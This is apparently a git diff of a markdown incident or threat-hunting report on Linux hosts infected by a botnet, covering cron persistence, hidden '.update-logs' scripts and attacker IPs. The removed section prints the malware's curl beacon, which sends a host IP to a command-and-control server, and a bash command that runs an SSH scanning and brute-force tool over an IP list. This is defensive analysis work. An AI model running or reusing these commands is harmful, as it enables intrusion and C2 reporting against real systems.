@@ -94,7 +94,7 @@ The device `Linux-VulnMgmt-Kobe` (IP `10.0.0.160`) began making repeated login a
 
 ---
 
-#### February 19, 2025
+#### February 19, 2025 — Cron-Based Persistence and Gafgyt Botnet Deployment
 
 **Device Involved:**  
 - `Linuz-scan-agent`
@@ -120,189 +120,6 @@ Subsequent research confirmed that `VwIEbFMroMSrleiJ` is an ELF file associated 
 
 **VirusTotal Scores:**
 - File `VwIEbFMroMSrleiJ`: **14/64**
-
----
-
-#### March 4 and 7, 2025 - *Need Title*
-
-March 4
-
-**Device Involved:**
-- `Linux-Program-Fix`
-
-**Activity:**
-A file ingress from IP address `170.64.230.111` via SCP was initiated, a file under the name of `cache` was written to the `/tmp` directory
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/d243bb56-63b2-4d7f-81c4-fb029943f9ba" alt="Detailed Process Timeline" width="700"/>
-</p>
-
-**Subsequent Activity:**
-Concurrently of the `cache` file drop, an additional file `MNFlEGNm` was introduced and executed. WE can see the resemblence of the file name with previous files encountered such as `UpzBUBnv` in our initital analysis.
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/14996335-df77-4ee9-bbba-8bc6ec6198b5" alt="Detailed Process Timeline" width="800"/>
-</p>
-
-**Malicious Scripts Observered Again:**
-Shortly after the execution of both `cache` and `MNFlEGNm`, hidden process named `.b` was launched. the `.b` binary has been observed in conjunction with scheduled `cron` jobs, indicating a potential persistence mechanism.
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/55ac6de8-403f-42d6-b11f-b8035455a84f" alt="Detailed Process Timeline" width="800"/>
-</p>
-
-
-March 7
-
-**Device Involved:**
-- `linux-programatic-ajs`
-
-**Activity:**
-Similar file ingress from IP address `196.251.88.103` via SCP created a file `cache` which was exwritten to the `/tmp` directory
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/6beead87-7cfc-4c3b-8bcf-5010a5f06bc9" alt="Detailed Process Timeline" width="700"/>
-</p>
-
-**Subsequent Activity:**
-File `AqsEUmKy` appeared—its naming convention closely aligns with previously observed files such as "MNFlEGNm" and "UpzBUBnv", suggesting a likely common origin and functionality. Concurrently, a hidden script named History was made executable and executed within the same /tmp/.update-logs directory. followed by the execution of an Update file from the same location potentially facilitating persistence or further payload execution tied to the cache and AqsEUmKy files
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/60a1fa32-8ccd-421b-9176-89533271eb84" alt="Detailed Process Timeline" width="700"/>
-</p>
-
-**More Activity:**
-file named `.bisis` was created and was tagged as PUA.Portscan commonly used for network reconnaissance or scanning for vulnerable services
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/2be455e3-a82d-4876-91b2-639c5ffcf726" alt="Detailed Process Timeline" width="700"/>
-</p>
-
-**VirusTotal Scores:**
-- `cache`: ****
-- `MNFlEGNm`: **N/A**
-- `AqsEUmKy`: **N/A**
-- `170.64.230.111`: **3/94**
-- `196.251.88.103`: ****
-- `.bisis`: ****
-
----
-
-#### March 8 2025 - *Need Title*
-
-**Device Involved:**
-- `linux-programatic-ajs`
-
-**Activity:**
-The same `linux-programatic-ajs` device displayed suspsicious activity with a command that silently sends a device's IP address to a remote server (`196.251.73.38:47`) via a crafted HTTP request using `curl`. It disguises the traffic as a legitimate browser request by adding typical headers. The use of --insecure bypasses SSL certificate validation, and the activity likely functions as a beacon — reporting the infected system’s presence back to a command-and-control (C2) server. It used IP `103.108.140.172` as the parameters. As you can see the `Update` file created and executed this curl script.
-
-```kql
-curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" 
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
-  -H "Accept-Language: en-US,en;q=0.9" 
-  -H "Cache-Control: max-age=0" 
-  -H "Connection: keep-alive" 
-  -H "Upgrade-Insecure-Requests: 1" 
-  --insecure
-```
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/f780335a-18a6-4043-863c-23c756c3439b" alt="Detailed Process Timeline" width="700"/>
-</p>
-
-**VirusTotal Scores:**
-- `Update`: ****
-- `196.251.73.38:47`: **N/A**
-- `103.108.140.172`: **N/A**
-
----
-
-#### March 14 - 17 2025 - *Need Title*
-
-March 14
-
-**Device Involved:**
-- `sakel-linux-2`
-
-**Activity:**
-Hidden script `History` was executed which triggered `Update` file to be within the same `.update-logs` directory to be ran. From the `Update` file running, both `.bisis` and `cache` were created. Proceeding was the execution of the `cache` file
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/c4f416f2-61a5-4ee8-9302-1fc3f039cf9d" alt="Detailed Process Timeline" width="700"/>
-  <img src="https://github.com/user-attachments/assets/24e63de5-8840-429c-b10c-9f119c1415cc" alt="Detailed Process Timeline" width="700"/>
-</p>
-
-**Additional Activity:**
-`cron` job initiated a background script `.b` that silently runs from the temp directory attempting to avoid detection. the `.b` directly. `cache` file dropped and launched again after the `.b` execution
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/1437548a-13c6-4bcd-92ba-fb7275099c7b" alt="Detailed Process Timeline" width="700"/>
-</p>
-
-**More Activity:**
-`Update` file is executed and then there is a curl command that silently sends an HTTP `GET` request to `http://196.251.73.38:47/save-data`, including an IP address (`45.64.186.20`) as a query parameter.
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/3c089219-b09e-4c85-a080-a0782ca36cca" width="700"/>
-</p>
-
-March 17
-
-**Activity:**
-`Update` file is silently ran exactly like the `.b` file from activity that occurred on the 14th
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/6756dbbe-9f5d-4b97-9475-cc4cf4850e6c" width="700"/>
-</p>
-
-**Following Activity:**
-Bash command runs and a hidden executable `.bisis` that takes a list of IPs and tries to connect to them via SSH without authentication, using settings from a config file (`data.json`). It also increases system limits to handle many simultaneous connections and then runs another script (`x`) afterward.
-
-```kql
-bash -c "
-cd /var/tmp/.update-logs
-chmod +x /var/tmp/.update-logs/.bisis
-ulimit -n 999999
-cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
-/var/tmp/.update-logs/x
-"
-```
-
-```kql
-/var/tmp/.update-logs/./.bisis ssh \
-  -o /var/tmp/.update-logs/data.json \
-  --userauth none \
-  --timeout 8
-```
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/067ad23e-3d6a-44b7-ae61-9cedc5a0f9a5" width="700"/>
-</p>
-
-**More Activity:**
-`.bisis` executable establishes connections with `200.98.171.149`, `200.98.172.116` to `200.98.172.139`, `200.98.173.40` to `200.98.173.44`, all through `port 22`
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/58b57c3f-d9c8-45f4-8e34-014fe41d24c4" width="700"/>
-  <img src="https://github.com/user-attachments/assets/e8f5d598-68d9-4b86-adda-ed9f1299b869" width="700"/>
-  <img src="https://github.com/user-attachments/assets/19e9e631-9908-441c-8a50-71c48a9d38cc" width="700"/>
-  <img src="https://github.com/user-attachments/assets/b6789f4d-4bc2-47ea-8035-91583df73889" width="700"/>
-</p>
-
-**Again More Activity:**
-`Update` file is ran again, triggering a `curl` command that exfiltrates a device’s IP address (`200.98.136.217`) to a remote server (`196.251.73.38:47`)
-
-<p align="center">  
-  <img src="https://github.com/user-attachments/assets/8b4825ab-89bd-40ba-819f-2a94d39266c1" width="700"/>
-</p>
-
-**VirusTotal Scores:**
-- `History`: ****
-- `Update`: **N/A**
-- `.bisis`: **N/A**
-- `cache`: **N/A**
-- `.b`: **N/A**
-- `196.251.73.38:47`: **N/A**
 
 ---
 
@@ -364,7 +181,7 @@ Shortly after, the `Update` file was seen re-creating a `cache` file used to avo
 A file named `cache` was transferred from IP `170.64.230.111` to the `/tmp` directory via SCP.
 
 <p align="center">  
-  <img src="https://github.com/user-attachments/assets/d243bb56-63b2-4d7f-81c4-fb029943f9ba" width="700"/>
+  <img src="https://github.com/user-attachments/assets/2c06592f-1ac1-4a8d-aee8-7ceb1969153f" width="700"/>
 </p>
 
 **Subsequent Behavior:**  
@@ -375,7 +192,7 @@ An additional file `MNFlEGNm` appeared and was executed, reflecting naming simil
 </p>
 
 **Malicious Activity:**  
-Execution of both `cache` and `MNFlEGNm` triggered a hidden process `.b`, likely associated with persistence via `cron` jobs.
+Shortly after the execution of both `cache` and `MNFlEGNm`, a hidden process `.b` was executed, associated with persistence via `cron` jobs.
 
 <p align="center">  
   <img src="https://github.com/user-attachments/assets/55ac6de8-403f-42d6-b11f-b8035455a84f" width="800"/>
@@ -394,7 +211,7 @@ A similar file ingress from IP `196.251.88.103` deposited `cache` in `/tmp`.
 </p>
 
 **Subsequent Behavior:**  
-File `AqsEUmKy` was introduced and executed, mirroring previous obfuscated naming conventions. Simultaneously, a hidden `History` script was executed within `.update-logs`, followed by `Update` — likely to establish persistence.
+File `AqsEUmKy` was introduced and executed, mirroring previous obfuscated naming conventions. Simultaneously, a hidden `History` script was executed within `.update-logs`, followed by `Update`.
 
 <p align="center">  
   <img src="https://github.com/user-attachments/assets/60a1fa32-8ccd-421b-9176-89533271eb84" width="700"/>
@@ -506,7 +323,7 @@ cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tm
 </p>
 
 **Recon & Lateral Movement:**  
-`.bisis` was used to connect to multiple IP addresses, performing scans and potentially brute-forcing.
+`.bisis` was used to connect to multiple IP addresses, performing scans and brute-forcing.
 
 <p align="center">  
   <img src="https://github.com/user-attachments/assets/58b57c3f-d9c8-45f4-8e34-014fe41d24c4" width="700"/>
